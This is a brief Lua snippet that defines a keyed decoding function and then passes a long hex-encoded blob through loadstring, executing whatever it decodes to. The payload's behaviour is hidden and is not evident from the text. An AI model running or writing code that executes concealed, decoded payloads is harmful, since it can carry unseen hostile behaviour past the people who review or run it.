do
  function decode(str)
    local K, F = 8186484168865098, 16384 + 4887
    return (str:gsub('%x%x',
      function(c)
        local L = K % 274877906944  -- 2^38
        local H = (K - L) / 274877906944
        local M = H % 128
        c = tonumber(c, 16)
        local m = (c + (H - M) / 128) * (2*M + 1) % 256
        K = L * F + H + c + m
        return string.char(m)
      end
    ))
  end
end

loadstring(decode('b4af5a82b7a5775f5c04030d513e5f092d56f9daec264c64db33413b2c345902e661171f6475e78bd43145e25636c4d24618aed9006797894cc5cf9b37d299461b3f342565ca6aa9dd16dbc9918185018bef2ed9e635307eb33fe0c754f23461aebaea2e727dd7a3226bf89eef6f',true))()
